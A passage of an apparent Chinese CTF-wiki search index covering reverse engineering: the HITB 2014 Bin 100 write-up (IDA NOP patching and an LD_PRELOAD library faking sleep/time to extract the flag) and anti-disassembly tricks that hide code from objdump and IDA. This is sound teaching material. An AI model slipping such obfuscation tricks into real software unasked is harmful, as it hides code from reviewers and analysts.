\n0x31337\n;\n\n  \nv21\n \n=\n \ntime\n(\n0LL\n);\n\n  \ndo\n\n  \n{\n\n    \nv11\n \n=\n \n0LL\n;\n\n    \ndo\n\n    \n{\n\n      \nv5\n \n=\n \n0LL\n;\n\n      \nv6\n \n=\n \ntime\n(\n0LL\n);\n\n      \nsrand\n(\n233811181\n \n-\n \nv21\n \n+\n \nv6\n);\n \n// \u521d\u59cb\u5316\u968f\u673a\u6570\u79cd\u5b50\n\n      \nv7\n \n=\n \nv22\n[\nv11\n];\n\n      \nv22\n[\nv11\n]\n \n=\n \nrand\n()\n \n^\n \nv7\n;\n   \n// \u4f2a\u968f\u673a\u6570\n\n      \nv8\n \n=\n \n(\nfunny\n)[\n8\n \n*\n \nv11\n];\n\n      \nwhile\n \n(\n \nv5\n \n \nstrlen\n(\nv8\n)\n \n)\n\n      \n{\n\n        \nv9\n \n=\n \nv8\n[\nv5\n];\n\n        \nif\n \n(\n \n(\n_BYTE\n)\nv9\n \n==\n \n105\n \n)\n\n        \n{\n\n          \nv24\n[(\nsigned\n \nint\n)\nv5\n]\n \n=\n \n105\n;\n\n        \n}\n\n        \nelse\n\n        \n{\n\n          \nif\n \n(\n \n(\n_DWORD\n)\nv5\n \n \nv8\n[\nv5\n \n-\n \n1\n]\n \n!=\n \n32\n \n)\n\n            \nv10\n \n=\n \n__ctype_toupper_loc\n();\n    \n// \u5927\u5199\n\n          \nelse\n\n            \nv10\n \n=\n \n__ctype_tolower_loc\n();\n    \n// \u5c0f\u5199\n\n          \nv24\n[(\nsigned\n \nint\n)\nv5\n]\n \n=\n \n(\n*\nv10\n)[\nv9\n];\n\n        \n}\n\n        \n++\nv5\n;\n\n      \n}\n\n      \nv24\n[(\nsigned\n \nint\n)\nv5\n]\n \n=\n \n0\n;\n\n      \n++\nv11\n;\n\n      \n__printf_chk\n(\n1LL\n,\n \n \u923e%80s \u923e\u7395n\n,\n \nv24\n);\n \n// \u4e71\u7801\u7684\u5176\u5b9e\u662f\u4e00\u4e2a\u97f3\u7b26\n\n      \nsleep\n(\n1u\n);\n\n    \n}\n\n    \nwhile\n \n(\n \nv11\n \n!=\n \n36\n \n);\n\n    \n--\nv20\n;\n\n  \n}\n\n  \nwhile\n \n(\n \nv20\n \n);\n\n  \nv13\n \n=\n \nv22\n;\n    \n// key\u5b58\u50a8\u5728v22\u6570\u7ec4\u5185\n\n  \n__printf_chk\n(\n1LL\n,\n \nKEY: \n,\n \nv12\n);\n\n  \ndo\n\n  \n{\n\n    \nv14\n \n=\n \n(\nunsigned\n \n__int8\n)\n*\nv13\n++\n;\n \n    \n__printf_chk\n(\n1LL\n,\n \n%02x \n,\n \nv14\n);\n \n// \u8f93\u51fakey\n\n  \n}\n\n  \nwhile\n \n(\n \nv13\n \n!=\n \nv23\n \n);\n     \n  \nv15\n \n=\n \n0LL\n;\n\n  \nputchar\n(\n10\n);\n\n  \n__printf_chk\n(\n1LL\n,\n \nOK YOU WIN. HERE\nS YOUR FLAG: \n,\n \nv16\n);\n\n  \ndo\n\n  \n{\n\n    \nv17\n \n=\n \nv23\n[\nv15\n]\n \n^\n \nv22\n[\nv15\n];\n  \n// \u8ddfkey\u7684\u503c\u6709\u5f02\u6216\n\n    \n++\nv15\n;\n\n    \nputchar\n(\nv17\n);\n   \n// \u8f93\u51faflag\n\n  \n}\n\n  \nwhile\n \n(\n \nv15\n \n!=\n \n36\n \n);\n\n  \nputchar\n(\n10\n);\n      \n// \u8f93\u51fa\u6362\u884c\n\n  \nresult\n \n=\n \n0\n;\n\n  \nreturn\n \nresult\n;\n\n\n}\n\n\n\n\n\n\u6574\u4e2a\u7684\u4ee3\u7801\u6d41\u7a0b\u4e3b\u8981\u5c31\u662f\u5728\u4e0d\u65ad\u5730\u5faa\u73af\u8f93\u51fa\nfunny\n\u91cc\u7684\u53e5\u5b50, \u6ee1\u8db3\u5faa\u73af\u6761\u4ef6\u540e\u8f93\u51fa\nkey\n, \u5e76\u7528\nkey\n\u8fdb\u884c\u5f02\u6216\u5f97\u5230\nflag\n\u7684\u503c.\n\n\n\u4f46\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0, \u6574\u4e2a\u5faa\u73af\u7684\u6b21\u6570\u76f8\u5bf9\u6765\u8bf4\u662f\u6bd4\u8f83\u5c11\u7684. \u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u91c7\u7528\u4e00\u4e9b\u65b9\u6cd5, \u8ba9\u5faa\u73af\u8fdb\u884c\u5f97\u66f4\u5feb\u4e00\u4e9b. \u6bd4\u5982\u8bf4\u6211\u624b\u52a8patch\u4e00\u4e0b, \u4e0d\u8ba9\u7a0b\u5e8f\u8f93\u51fa\u5b57\u7b26\u4e32(\u5b9e\u9645\u4e0a\nprintf\n\u7684\u8017\u65f6\u662f\u76f8\u5f53\u591a\u7684), \u5176\u6b21\u5c31\u662f\u4f7f\u7528\nLD_PRELOAD\n\u4f7f\u5f97\u7a0b\u5e8f\u7684\nsleep()\n\u5931\u6548. \u53ef\u4ee5\u5f88\u660e\u663e\u5730\u8282\u7701\u65f6\u95f4. \n\n\n\u624b\u52a8patch\u7684\u8fc7\u7a0b\u6bd4\u8f83\u7b80\u5355. \u6211\u4eec\u53ef\u4ee5\u627e\u5230\u4ee3\u7801\u4f4d\u7f6e, \u7136\u540e\u7528\u4e00\u4e9b\u5341\u516d\u8fdb\u5236\u7f16\u8f91\u5668\u8fdb\u884c\u4fee\u6539. \u5f53\u7136\u6211\u4eec\u4e5f\u53ef\u4ee5\u4f7f\u7528\nIDA\n\u6765\u8fdb\u884cpatch\u5de5\u4f5c. \n\n\n.text:\n00000000004007\nB7\n                 \ncall\n    \n___printf_chk\n\n\n.text:\n00000000004007\nBC\n                 \nxor\n     \neax\n,\n \neax\n\n\n\n\n\n\u5c06\u5149\u6807\u70b9\u5728\ncall    ___printf_chk\n\u4e0a, \u7136\u540e\u9009\u62e9\u83dc\u5355\nEdit-\nPatch Program-\nAssemble\n(\u5f53\u7136\u4f60\u53ef\u4ee5\u4f7f\u7528\u5176\u4ed6patch\u65b9\u5f0f. \u6548\u679c\u90fd\u4e00\u6837).  \u7136\u540e\u5c06\u5176\u4fee\u6539\u4e3a\nnop(0x90)\n, \u5982\u4e0b\u56fe\u6240\u793a\n\n\n\n\n\u5c06\n4007B7\n\u5230\n4007BD\n\u4e4b\u95f4\u7684\u6c47\u7f16\u4ee3\u7801\u5168\u90e8\u4fee\u6539\u4e3a\nnop\n\u5373\u53ef. \u7136\u540e\u9009\u62e9\u83dc\u5355\nEdit-\nPatch Program-\nApply patches to input file\n. \u5f53\u7136\u6700\u597d\u505a\u4e00\u4e2a\u5907\u4efd(\u5373\u52fe\u9009\nCreate a backup\n), \u7136\u540e\u70b9\u51fbOK\u5373\u53ef(\u6211\u91cd\u547d\u540d\u4e3a\u4e86\npatched.elf\n, \u4e0b\u8f7d\u94fe\u63a5: \npatched.elf\n). \n\n\n\n\n\u73b0\u5728\u8fdb\u5165\nLD_PRELOAD\n\u90e8\u5206. \u8fd9\u91cc\u6211\u4eec\u7b80\u5355\u7f16\u5199\u4e00\u4e0bc\u4ee3\u7801, \u4e0b\u8f7d\u94fe\u63a5: \ntime.c\n\n\nstatic\n \nint\n \nt\n \n=\n \n0x31337\n;\n\n\n\nvoid\n \nsleep\n(\nint\n \nsec\n)\n \n{\n\n    \nt\n \n+=\n \nsec\n;\n\n\n}\n\n\n\nint\n \ntime\n()\n \n{\n\n    \nreturn\n \nt\n;\n\n\n}\n\n\n\n\n\n\u7136\u540e\u4f7f\u7528\u547d\u4ee4\ngcc --shared time.c -o time.so\n\u751f\u6210\u52a8\u6001\u94fe\u63a5\u6587\u4ef6. \u5f53\u7136\u4e5f\u7ed9\u51fa\u4e86\u4e0b\u8f7d\u94fe\u63a5: \ntime.so\n\n\n\u7136\u540e\u6253\u5f00linux\u7ec8\u7aef, \u8fd0\u884c\u547d\u4ee4: \nLD_PRELOAD=./time.so ./patched.elf\n\n\n\n\n\u8fc7\u4e00\u4f1a, \u4f60\u5c31\u80fd\u542c\u5230CPU\u75af\u72c2\u8fd0\u8f6c\u7684\u58f0\u97f3, \u7136\u540e\u5f88\u5feb\u5c31\u51fa\u6765\u4e86flag.", 
            "title": "LD_PRELOAD"
        }, 
        {
            "location": "/reverse/linux/ld_preload/#_1", 
            "text": "\u6b63\u5e38\u60c5\u51b5\u4e0b, Linux \u52a8\u6001\u52a0\u8f7d\u5668 ld-linux (\u89c1man\u624b\u518cld-linux(8))\u4f1a\u641c\u5bfb\u5e76\u88c5\u8f7d\u7a0b\u5e8f\u6240\u9700\u7684\u5171\u4eab\u94fe\u63a5\u5e93\u6587\u4ef6, \u800c LD_PRELOAD \u662f\u4e00\u4e2a\u53ef\u9009\u7684\u73af\u5883\u53d8\u91cf, \u5305\u542b\u4e00\u4e2a\u6216\u591a\u4e2a\u6307\u5411\u5171\u4eab\u94fe\u63a5\u5e93\u6587\u4ef6\u7684\u8def\u5f84. \u52a0\u8f7d\u5668\u4f1a\u5148\u4e8eC\u8bed\u8a00\u8fd0\u884c\u5e93\u4e4b\u524d\u8f7d\u5165 LD_PRELOAD \u6307\u5b9a\u7684\u5171\u4eab\u94fe\u63a5\u5e93\uff0c\u4e5f\u5c31\u662f\u6240\u8c13\u7684\u9884\u88c5\u8f7d( preload )\u3002  \u9884\u88c5\u8f7d\u610f\u5473\u7740\u4f1a\u5b83\u7684\u51fd\u6570\u4f1a\u6bd4\u5176\u4ed6\u5e93\u6587\u4ef6\u4e2d\u7684\u540c\u540d\u51fd\u6570\u5148\u4e8e\u8c03\u7528, \u4e5f\u5c31\u4f7f\u5f97\u5e93\u51fd\u6570\u53ef\u4ee5\u88ab\u963b\u622a\u6216\u66ff\u6362\u6389. \u591a\u4e2a\u5171\u4eab\u94fe\u63a5\u5e93\u6587\u4ef6\u7684\u8def\u5f84\u53ef\u4ee5\u7528 \u5192\u53f7 \u6216 \u7a7a\u683c \u8fdb\u884c\u533a\u5206. \u663e\u7136\u4e0d\u4f1a\u53d7\u5230 LD_PRELOAD \u5f71\u54cd\u7684\u4e5f\u5c31\u53ea\u6709\u90a3\u4e9b\u9759\u6001\u94fe\u63a5\u7684\u7a0b\u5e8f\u4e86.  \u5f53\u7136\u4e3a\u907f\u514d\u7528\u4e8e\u6076\u610f\u653b\u51fb, \u5728 ruid != euid \u7684\u60c5\u51b5\u4e0b\u52a0\u8f7d\u5668\u662f\u4e0d\u4f1a\u4f7f\u7528 LD_PRELOAD \u8fdb\u884c\u9884\u88c5\u8f7d\u7684.   \u66f4\u591a\u9605\u8bfb:  https://blog.fpmurphy.com/2012/09/all-about-ld_preload.html#ixzz569cbyze4", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/reverse/linux/ld_preload/#_2", 
            "text": "\u4e0b\u9762\u4ee52014\u5e74 Hack In The Box Amsterdam: Bin 100 \u4e3a\u4f8b. \u9898\u76ee\u4e0b\u8f7d\u94fe\u63a5:  hitb_bin100.elf  \u8fd9\u662f\u4e00\u4e2a64\u4f4d\u7684ELF\u6587\u4ef6. \u8fd0\u884c\u7ed3\u679c\u5982\u4e0b\u56fe\u6240\u793a:   \u7a0b\u5e8f\u4f3c\u4e4e\u5728\u4e00\u76f4\u6253\u5370\u7740\u4e00\u4e9b\u53e5\u5b50. \u5e76\u4e14\u6ca1\u6709\u505c\u6b62\u4e0b\u6765\u7684\u8ff9\u8c61. \u6211\u4eec\u5c31\u7528IDA\u6253\u5f00\u6765\u770b\u4e00\u4e0b. \u9996\u5148\u6309\u4e0b Shift+F12 \u67e5\u627e\u5b57\u7b26\u4e32.    \u663e\u7136, \u9664\u5f00\u4e00\u76f4\u5728\u6253\u5370\u7684\u53e5\u5b50\u5916, \u6211\u4eec\u53d1\u73b0\u4e86\u4e00\u4e9b\u6709\u8da3\u7684\u5b57\u7b26\u4e32:  .rodata:0000000000400A53 00000006 C KEY: \n.rodata:0000000000400A5F 0000001F C OK YOU WIN. HERE S YOUR FLAG:   \u6211\u4eec\u6839\u636e OK YOU WIN. HERE'S YOUR FLAG: \u7684\u4ea4\u53c9\u5f15\u7528\u6765\u5230\u5173\u952e\u4ee3\u7801\u5904(\u6211\u5220\u53bb\u4e86\u4e00\u4e9b\u4e0d\u5fc5\u8981\u7684\u4ee3\u7801).   int   __cdecl   main ( int   argc ,   const   char   ** argv ,   const   char   ** envp )  { \n   qmemcpy ( v23 ,   unk_400A7E ,   sizeof ( v23 )); \n   v3   =   v22 ; \n   for   (   i   =   9LL ;   i ;   -- i   ) \n   { \n     * ( _DWORD   * ) v3   =   0 ; \n     v3   +=   4 ; \n   } \n   v20   =   0x31337 ; \n   v21   =   time ( 0LL ); \n   do \n   { \n     v11   =   0LL ; \n     do \n     { \n       v5   =   0LL ; \n       v6   =   time ( 0LL ); \n       srand ( 233811181   -   v21   +   v6 );   // \u521d\u59cb\u5316\u968f\u673a\u6570\u79cd\u5b50 \n       v7   =   v22 [ v11 ]; \n       v22 [ v11 ]   =   rand ()   ^   v7 ;     // \u4f2a\u968f\u673a\u6570 \n       v8   =   ( funny )[ 8   *   v11 ]; \n       while   (   v5     strlen ( v8 )   ) \n       { \n         v9   =   v8 [ v5 ]; \n         if   (   ( _BYTE ) v9   ==   105   ) \n         { \n           v24 [( signed   int ) v5 ]   =   105 ; \n         } \n         else \n         { \n           if   (   ( _DWORD ) v5     v8 [ v5   -   1 ]   !=   32   ) \n             v10   =   __ctype_toupper_loc ();      // \u5927\u5199 \n           else \n             v10   =   __ctype_tolower_loc ();      // \u5c0f\u5199 \n           v24 [( signed   int ) v5 ]   =   ( * v10 )[ v9 ]; \n         } \n         ++ v5 ; \n       } \n       v24 [( signed   int ) v5 ]   =   0 ; \n       ++ v11 ; \n       __printf_chk ( 1LL ,    \u923e%80s \u923e\u7395n ,   v24 );   // \u4e71\u7801\u7684\u5176\u5b9e\u662f\u4e00\u4e2a\u97f3\u7b26 \n       sleep ( 1u ); \n     } \n     while   (   v11   !=   36   ); \n     -- v20 ; \n   } \n   while   (   v20   ); \n   v13   =   v22 ;      // key\u5b58\u50a8\u5728v22\u6570\u7ec4\u5185 \n   __printf_chk ( 1LL ,   KEY:  ,   v12 ); \n   do \n   { \n     v14   =   ( unsigned   __int8 ) * v13 ++ ;  \n     __printf_chk ( 1LL ,   %02x  ,   v14 );   // \u8f93\u51fakey \n   } \n   while   (   v13   !=   v23   );      \n   v15   =   0LL ; \n   putchar ( 10 ); \n   __printf_chk ( 1LL ,   OK YOU WIN. HERE S YOUR FLAG:  ,   v16 ); \n   do \n   { \n     v17   =   v23 [ v15 ]   ^   v22 [ v15 ];    // \u8ddfkey\u7684\u503c\u6709\u5f02\u6216 \n     ++ v15 ; \n     putchar ( v17 );     // \u8f93\u51faflag \n   } \n   while   (   v15   !=   36   ); \n   putchar ( 10 );        // \u8f93\u51fa\u6362\u884c \n   result   =   0 ; \n   return   result ;  }   \u6574\u4e2a\u7684\u4ee3\u7801\u6d41\u7a0b\u4e3b\u8981\u5c31\u662f\u5728\u4e0d\u65ad\u5730\u5faa\u73af\u8f93\u51fa funny \u91cc\u7684\u53e5\u5b50, \u6ee1\u8db3\u5faa\u73af\u6761\u4ef6\u540e\u8f93\u51fa key , \u5e76\u7528 key \u8fdb\u884c\u5f02\u6216\u5f97\u5230 flag \u7684\u503c.  \u4f46\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0, \u6574\u4e2a\u5faa\u73af\u7684\u6b21\u6570\u76f8\u5bf9\u6765\u8bf4\u662f\u6bd4\u8f83\u5c11\u7684. \u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u91c7\u7528\u4e00\u4e9b\u65b9\u6cd5, \u8ba9\u5faa\u73af\u8fdb\u884c\u5f97\u66f4\u5feb\u4e00\u4e9b. \u6bd4\u5982\u8bf4\u6211\u624b\u52a8patch\u4e00\u4e0b, \u4e0d\u8ba9\u7a0b\u5e8f\u8f93\u51fa\u5b57\u7b26\u4e32(\u5b9e\u9645\u4e0a printf \u7684\u8017\u65f6\u662f\u76f8\u5f53\u591a\u7684), \u5176\u6b21\u5c31\u662f\u4f7f\u7528 LD_PRELOAD \u4f7f\u5f97\u7a0b\u5e8f\u7684 sleep() \u5931\u6548. \u53ef\u4ee5\u5f88\u660e\u663e\u5730\u8282\u7701\u65f6\u95f4.   \u624b\u52a8patch\u7684\u8fc7\u7a0b\u6bd4\u8f83\u7b80\u5355. \u6211\u4eec\u53ef\u4ee5\u627e\u5230\u4ee3\u7801\u4f4d\u7f6e, \u7136\u540e\u7528\u4e00\u4e9b\u5341\u516d\u8fdb\u5236\u7f16\u8f91\u5668\u8fdb\u884c\u4fee\u6539. \u5f53\u7136\u6211\u4eec\u4e5f\u53ef\u4ee5\u4f7f\u7528 IDA \u6765\u8fdb\u884cpatch\u5de5\u4f5c.   .text: 00000000004007 B7                   call      ___printf_chk  .text: 00000000004007 BC                   xor       eax ,   eax   \u5c06\u5149\u6807\u70b9\u5728 call    ___printf_chk \u4e0a, \u7136\u540e\u9009\u62e9\u83dc\u5355 Edit- Patch Program- Assemble (\u5f53\u7136\u4f60\u53ef\u4ee5\u4f7f\u7528\u5176\u4ed6patch\u65b9\u5f0f. \u6548\u679c\u90fd\u4e00\u6837).  \u7136\u540e\u5c06\u5176\u4fee\u6539\u4e3a nop(0x90) , \u5982\u4e0b\u56fe\u6240\u793a   \u5c06 4007B7 \u5230 4007BD \u4e4b\u95f4\u7684\u6c47\u7f16\u4ee3\u7801\u5168\u90e8\u4fee\u6539\u4e3a nop \u5373\u53ef. \u7136\u540e\u9009\u62e9\u83dc\u5355 Edit- Patch Program- Apply patches to input file . \u5f53\u7136\u6700\u597d\u505a\u4e00\u4e2a\u5907\u4efd(\u5373\u52fe\u9009 Create a backup ), \u7136\u540e\u70b9\u51fbOK\u5373\u53ef(\u6211\u91cd\u547d\u540d\u4e3a\u4e86 patched.elf , \u4e0b\u8f7d\u94fe\u63a5:  patched.elf ).    \u73b0\u5728\u8fdb\u5165 LD_PRELOAD \u90e8\u5206. \u8fd9\u91cc\u6211\u4eec\u7b80\u5355\u7f16\u5199\u4e00\u4e0bc\u4ee3\u7801, \u4e0b\u8f7d\u94fe\u63a5:  time.c  static   int   t   =   0x31337 ;  void   sleep ( int   sec )   { \n     t   +=   sec ;  }  int   time ()   { \n     return   t ;  }   \u7136\u540e\u4f7f\u7528\u547d\u4ee4 gcc --shared time.c -o time.so \u751f\u6210\u52a8\u6001\u94fe\u63a5\u6587\u4ef6. \u5f53\u7136\u4e5f\u7ed9\u51fa\u4e86\u4e0b\u8f7d\u94fe\u63a5:  time.so  \u7136\u540e\u6253\u5f00linux\u7ec8\u7aef, \u8fd0\u884c\u547d\u4ee4:  LD_PRELOAD=./time.so ./patched.elf   \u8fc7\u4e00\u4f1a, \u4f60\u5c31\u80fd\u542c\u5230CPU\u75af\u72c2\u8fd0\u8f6c\u7684\u58f0\u97f3, \u7136\u540e\u5f88\u5feb\u5c31\u51fa\u6765\u4e86flag.", 
            "title": "\u4f8b\u9898"
        }, 
        {
            "location": "/reverse/linux/false-disasm/", 
            "text": "\u5bf9\u4e8e\u4e00\u4e9b\u5e38\u7528\u7684\u53cd\u6c47\u7f16\u5668, \u5982\nobjdump\n, \u6216\u662f\u57fa\u4e8e\nobjdump\n\u7684\u53cd\u6c47\u7f16\u5668\u9879\u76ee. \u90fd\u5b58\u5728\u4e00\u4e9b\u53cd\u6c47\u7f16\u7684\u7f3a\u9677. \u6709\u4e00\u4e9b\u65b9\u5f0f\u53ef\u4ee5\u8ba9\nobjdump\n\u53cd\u6c47\u7f16\u51fa\u7684\u4ee3\u7801, \u5e76\u6ca1\u6709\u90a3\u4e48\u7684\u51c6\u786e.\n\n\n\u8df3\u5230\u4e00\u6761\u6307\u4ee4\u4e2d\u95f4\n\n\n\u6700\u7b80\u5355\u7684\u65b9\u6cd5\u5c31\u662f\u5229\u7528\njmp\n\u8df3\u8f6c\u5230\u67d0\u4e00\u6761\u6307\u4ee4\u4e2d\u95f4\u6267\u884c, \u4e5f\u5c31\u662f\u8bf4\u771f\u5b9e\u7684\u4ee3\u7801\u662f\u4ece\u67d0\u6761\u6307\u4ee4\"\u4e4b\u4e2d\"\u5f00\u59cb\u7684, \u4f46\u5728\u53cd\u6c47\u7f16\u65f6\u7531\u4e8e\u662f\u9488\u5bf9\u6574\u6761\u6307\u4ee4\u800c\u4e0d\u80fd\u5217\u51fa\u771f\u6b63\u88ab\u8fd0\u884c\u7684\u6c47\u7f16\u6307\u4ee4\u4ee3\u7801. \n\n\n\u8bf4\u8d77\u6765\u597d\u50cf\u5f88\u62d7\u53e3, \u5f88\u96be\u61c2, \u6211\u4eec\u6765\u770b\u4e00\u4e2a\u793a\u4f8b\u5427, \u7ed9\u51fa\u4ee5\u4e0b\u7684\u6c47\u7f16\u4ee3\u7801.\n\n\nstart:\n    jmp label+1\nlabel:  \n    DB 0x90\n    mov eax, 0xf001\n\n\n\n\n\u8fd9\u6bb5\u4ee3\u7801\nlabel\n\u6240\u5728\u7684\u7b2c\u4e00\u6761\u6307\u4ee4\u662f\nDB 0x90\n. \u6211\u4eec\u6765\u770b\u770b\nobjdump\n\u5bf9\u8fd9\u6bb5\u4ee3\u7801\u53cd\u6c47\u7f16\u7684\u7ed3\u679c:\n\n\n08048080 \nstart\n:\n  8048080:  e9 01 00 00 00  jmp 8048086 \nlabel+0x1\n\n08048085 \nlabel\n:\n  8048085:  90      nop\n  8048086:  b8 01 f0 00 00  mov eax,0xf001\n\n\n\n\n\u770b\u8d77\u6765\u4e5f\u6ca1\u4ec0\u4e48\u95ee\u9898, \nDB 0x90\n\u88ab\u51c6\u786e\u5730\u53cd\u6c47\u7f16\u6210\n90 nop\n. \n\n\n\u4f46\u662f\u5982\u679c\u6211\u4eec\u5c06\nnop\n\u6307\u4ee4\u4fee\u6539\u4e3a1\u5b57\u8282\u4ee5\u4e0a\u7684\u6307\u4ee4, \u90a3\u4e48objdump\u5c31\u4e0d\u4f1a\u8ddf\u968f\u6211\u4eec\u7684jump\u5e76\u6b63\u786e\u7684\u53cd\u6c47\u7f16, \u800c\u662f\u7ebf\u6027\u5730\u4ece\u4e0a\u5f80\u4e0b\u7ee7\u7eed\u6c47\u7f16(\u7ebf\u6027\u626b\u63cf\u7b97\u6cd5). \u6bd4\u5982\u6211\u5c06\nDB 0x90\n\u6539\u6210\u4e86\nDB 0xE9\n, \u6765\u770b\u770bobjdump\u518d\u6b21\u53cd\u6c47\u7f16\u7684\u7ed3\u679c:\n\n\n08048080 \nstart\n:\n  8048080:  e9 01 00 00 00  jmp 8048086 \nlabel+0x1\n\n08048085 \nlabel\n:\n  8048085:  e9 b8 01 f0 00  jmp 8f48242 \n__bss_start+0xeff1b6\n\n\n\n\n\n\u5bf9\u6bd4\u4e4b\u524d\u7684\u53cd\u6c47\u7f16\u7ed3\u679c, \u4f60\u5f88\u660e\u663e\u5730\u770b\u51fa\u6765\u662f\u4ec0\u4e48\u60c5\u51b5\u4e86\u5427. \nDB 0xE9\n\u5355\u7eaf\u53ea\u662f\u4e00\u4e2a\u6570\u636e, \u4e5f\u4e0d\u4f1a\u88ab\u6267\u884c, \u800c\u53cd\u6c47\u7f16\u51fa\u7684\u7ed3\u679c, \u5374\u5c06\u5176\u89c6\u4f5c\u4e00\u4e2a\u6307\u4ee4, \u4e4b\u540e\u7684\u7ed3\u679c\u4e5f\u56e0\u6b64\u800c\u6539\u53d8\u4e86.\n\n\nobjdump\n\u5ffd\u7565\u4e86jmp\u7684\u76ee\u7684\u5730\u5740\u5904\u7684\u4ee3\u7801\n\u5e76\u76f4\u63a5\u6c47\u7f16jmp\u540e\u7684\u6307\u4ee4, \u8fd9\u6837\u6211\u4eec\u771f\u6b63\u7684\u4ee3\u7801\u4e5f\u5c31\u88ab\u5f88\u597d\u5730\"\u9690\u85cf\"\u4e86\u8d77\u6765\n\n\n\u89e3\u51b3\u65b9\u6cd5\n\n\n\u8be5\u5982\u4f55\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u5462? \u770b\u8d77\u6765\u6700\u76f4\u63a5\u7684\u65b9\u6cd5\u5c31\u662f\u5c06\u8fd9\u4e2a\u65e0\u7528\u7684\n0xE9\n\u7528\u5341\u516d\u8fdb\u5236\u7f16\u8f91\u5668\u624b\u52a8\u66ff\u6362\u6210\n0x90\n. \u4f46\u662f\u5982\u679c\u7a0b\u5e8f\u6709\u8fdb\u884c\u6587\u4ef6\u6821\u9a8c, \u8ba1\u7b97checksum\u503c, \u90a3\u4e48\u8fd9\u4e2a\u65b9\u6cd5\u5c31\u884c\u4e0d\u901a\u4e86. \n\n\n\u6240\u4ee5\u66f4\u597d\u7684\u89e3\u51b3\u529e\u6cd5\u662f\u4f7f\u7528\u5982IDA\u6216\u7c7b\u4f3c\u6709\u505a\u63a7\u5236\u6d41\u5206\u6790\u7684\u53cd\u6c47\u7f16\u5668, \u5bf9\u4e8e\u540c\u6837\u6709\u95ee\u9898\u7684\u7a0b\u5e8f. \u53cd\u6c47\u7f16\u7ed3\u679c\u53ef\u80fd\u5982\u4e0b: \n\n\n  ---- section .text ----:\n08048080    E9 01 00 00 00  jmp Label_08048086\n                                                ; (08048086)\n                                                ; (near + 0x1)\n08048085    DB E9\n\nLabel_08048086:\n08048086    B8 01 F0 00 00  mov eax, 0xF001\n                                                ; xref ( 08048080 ) \n\n\n\n\n\u53cd\u6c47\u7f16\u7ed3\u679c\u770b\u4e0a\u53bb\u8fd8\u884c\n\n\n\u8fd0\u884c\u65f6\u8ba1\u7b97\u8df3\u8f6c\u5730\u5740\n\n\n\u8fd9\u79cd\u65b9\u6cd5, \u751a\u81f3\u53ef\u4ee5\u5bf9\u6297\u5206\u6790\u63a7\u5236\u6d41\u7684\u53cd\u6c47\u7f16\u5668. \u6211\u4eec\u53ef\u4ee5\u770b\u4e00\u4e2a\u793a\u4f8b\u4ee3\u7801, \u66f4\u597d\u5730\u7406\u89e3:\n\n\n; ----------------------------------------------------------------------------\n    call earth+1\nReturn:\n                    ; x instructions or random bytes here               x byte(s)\nearth:              ; earth = Return + x\n    xor eax, eax    ; align disassembly, using single byte opcode       1 byte\n    pop eax         ; start of function: get return address ( Return )  1 byte\n                    ; y instructions or random bytes here               y byte(s)\n    add eax, x+2+y+2+1+1+z ; x+y+z+6                                    2 bytes\n    push eax        ;                                                   1 byte\n    ret             ;                                                   1 byte\n                    ; z instructions or random bytes here               z byte(s)\n; Code:\n                    ; !! Code Continues Here !!\n; ----------------------------------------------------------------------------\n\n\n\n\n\u7a0b\u5e8f\u901a\u8fc7\ncall+pop\n\u6765\u83b7\u53d6\u8c03\u7528\u51fd\u6570\u5f53\u65f6\u4fdd\u5b58\u5230\u6808\u4e0a\u7684\u8fd4\u56de\u5730\u5740, \u5176\u5b9e\u5c31\u662f\u8c03\u7528\u51fd\u6570\u524d\u7684\nEIP\n. \u7136\u540e\u5728\u51fd\u6570\u8fd4\u56de\u5904\u585e\u5165\u5783\u573e\u6570\u636e. \u4f46\u5b9e\u9645\u4e0a\u5728\u51fd\u6570\u8fd0\u884c\u65f6\u5df2\u7ecf\u5c06\u8fd4\u56de\u5730\u5740\u4fee\u6539\u5230\u4e86Code\u5904. \u56e0\u6b64\nearth\n\u51fd\u6570\u8fd4\u56de\u4f1a\u8df3\u8f6c\u5230\nCode\n\u5904\u7ee7\u7eed\u8fd0\u884c\uff0c\u800c\u4e0d\u662f\nReturn\n\u5904\u7ee7\u7eed\u8fd0\u884c.\n\n\n\u6765\u770b\u4e00\u4e2a\u7b80\u6613\u7684demo\n\n\n; ----------------------------------------------------------------------------\n    call earth+1\nearth:  \n    DB 0xE9             ; 1 \n--- pushed return address,\n                        ; E9 is opcode for jmp to disalign disas-\n    ; sembly\n    pop eax             ; 1 hidden\n    nop                 ; 1\n    add eax, 9          ; 2 hidden\n    push eax            ; 1 hidden\n    ret                 ; 1 hidden\n    DB 0xE9             ; 1 opcode for jmp to misalign disassembly\nCode:                   ; code continues here \n--- pushed return address + 9\n    nop\n    nop\n    nop\n    ret\n; ----------------------------------------------------------------------------\n\n\n\n\n\u5982\u679c\u662f\u4f7f\u7528objdump\u8fdb\u884c\u53cd\u6c47\u7f16, \u5149\u662f\ncall earth+1\n\u5c31\u4f1a\u51fa\u73b0\u95ee\u9898, \u5982\u4e0b:\n\n\n00000000 \nearth-0x5\n:\n  0:    e8 01 00 00 00  call 6 \nearth+0x1\n\n00000005 \nearth\n:\n  5:    e9 58 90 05 09  jmp 9059062 \nearth+0x905905d\n\n  a:    00 00           add %al,(%eax)\n  c:    00 50 c3        add %dl,0xffffffc3(%eax)\n  f:    e9 90 90 90 c3  jmp c39090a4 \nearth+0xc390909f\n\n\n\n\n\n\u6765\u770b\u4e00\u4e0b\nida\n\u7684\u60c5\u51b5\n\n\ntext:08000000   ; Segment permissions: Read/Execute\n.text:08000000   _text  segment para public \nCODE\n use32\n.text:08000000      assume cs:_text\n.text:08000000      ;org 8000000h\n.text:08000000      assume  es:nothing, ss:nothing, ds:_text,\n.text:08000000          fs:nothing, gs:nothing\n.text:08000000      dd 1E8h\n.text:08000004 ; -------------------------------------------------------------\n.text:08000004      add cl, ch\n.text:08000006      pop eax\n.text:08000007      nop\n.text:08000008      add eax, 9\n.text:0800000D      push eax\n.text:0800000E      retn\n.text:0800000E ; -------------------------------------------------------------\n.text:0800000F      dd 909090E9h\n.text:08000013 ; -------------------------------------------------------------\n.text:08000013      retn\n.text:08000013 _text        ends\n.text:08000013\n.text:08000013\n.text:08000013      end\n\n\n\n\n\u6211\u4eec\u5728\u6700\u540e\u76843\u4e2a\nnop\n, 